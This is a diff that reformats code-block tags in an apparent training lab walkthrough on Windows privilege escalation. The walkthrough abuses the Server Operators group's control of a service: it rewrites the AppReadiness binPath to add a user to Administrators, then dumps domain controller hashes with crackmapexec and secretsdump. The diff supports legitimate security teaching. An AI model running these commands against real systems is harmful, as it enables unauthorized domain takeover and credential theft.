@@ -10,8 +10,7 @@ Membership of this group confers the powerful `SeBackupPrivilege` and `SeRestore
 
 Let's examine the `AppReadiness` service. We can confirm that this service starts as SYSTEM using the `sc.exe` utility.
 
-```
-        cmd
+```bat
 C:\htb> sc qc AppReadiness
 
 [SC] QueryServiceConfig SUCCESS
@@ -32,8 +31,7 @@ SERVICE_NAME: AppReadiness
 
 We can use the service viewer/controller [PsService](https://docs.microsoft.com/en-us/sysinternals/downloads/psservice), which is part of the Sysinternals suite, to check permissions on the service. `PsService` works much like the `sc` utility and can display service status and configurations and also allow you to start, stop, pause, resume, and restart services both locally and on remote hosts.
 
-```
-        cmd
+```bat
 C:\htb> c:\Tools\PsService.exe security AppReadiness
 
 PsService v2.25 - Service information and configuration utility
@@ -80,8 +78,7 @@ This confirms that the Server Operators group has [SERVICE\_ALL\_ACCESS](https:/
 
 Let's take a look at the current members of the local administrators group and confirm that our target account is not present.
 
-```
-        cmd
+```bat
 C:\htb> net localgroup Administrators
 
 Alias name     Administrators
@@ -100,8 +97,7 @@ The command completed successfully.
 
 Let's change the binary path to execute a command which adds our current user to the default local administrators group.
 
-```
-        cmd
+```bat
 C:\htb> sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
 
 [SC] ChangeServiceConfig SUCCESS
@@ -111,8 +107,7 @@ C:\htb> sc config AppReadiness binPath= "cmd /c net localgroup Administrators se
 
 Starting the service fails, which is expected.
 
-```
-        cmd
+```bat
 C:\htb> sc start AppReadiness
 
 [SC] StartService FAILED 1053:
@@ -124,8 +119,7 @@ The service did not respond to the start or control request in a timely fashion.
 
 If we check the membership of the administrators group, we see that the command was executed successfully.
 
-```
-        cmd
+```bat
 C:\htb> net localgroup Administrators
 
 Alias name     Administrators
@@ -145,8 +139,7 @@ The command completed successfully.
 
 From here, we have full control over the Domain Controller and could retrieve all credentials from the NTDS database and access other systems, and perform post-exploitation tasks.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'
 
 SMB         10.129.43.9     445    WINLPE-DC01      [*] Windows 10.0 Build 17763 (name:WINLPE-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
@@ -155,8 +148,7 @@ SMB         10.129.43.9     445    WINLPE-DC01      [+] INLANEFREIGHT.LOCAL\serv
 
 #### Retrieving NTLM Password Hashes from the Domain Controller
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator
 
 Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation
